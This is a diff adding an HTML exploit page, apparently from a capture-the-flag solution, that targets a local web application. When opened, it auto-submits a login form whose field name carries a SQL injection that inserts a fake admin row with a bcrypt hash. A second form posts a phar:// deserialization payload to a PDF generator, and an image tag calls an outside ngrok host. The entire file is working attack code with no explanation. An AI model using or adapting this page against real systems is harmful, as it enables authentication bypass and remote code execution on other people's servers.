@@ -1,0 +1,19 @@
+<iframe name="blah"></iframe>
+<iframe name="blah2"></iframe>
+<form action="http://localhost/login" method="POST" target="blah">
+	<input name="username" value="admin" />
+	<input
+		name='""union/**/select/**/1,"admin","$2y$10$nesEyiJKMb8sZifSwP7gzeMUmucBxjD7cKO/mmWyuK1iuwOLGvAFe","","admin"#'
+		value="sdf"
+	/>
+	<input name="password" value="" />
+</form>
+<form action="http://localhost/pdf-maker" method="POST" target="blah2">
+	<input name="body" value="<h1>phar://FILENAME</h1>" />
+	<input name="option" value="generateFromHtml" />
+</form>
+<script>
+	document.forms[0].submit();
+	setTimeout(() => document.forms[1].submit(), 1000);
+</script>
+<img src="http://2.tcp.ngrok.io:12600/hang" />
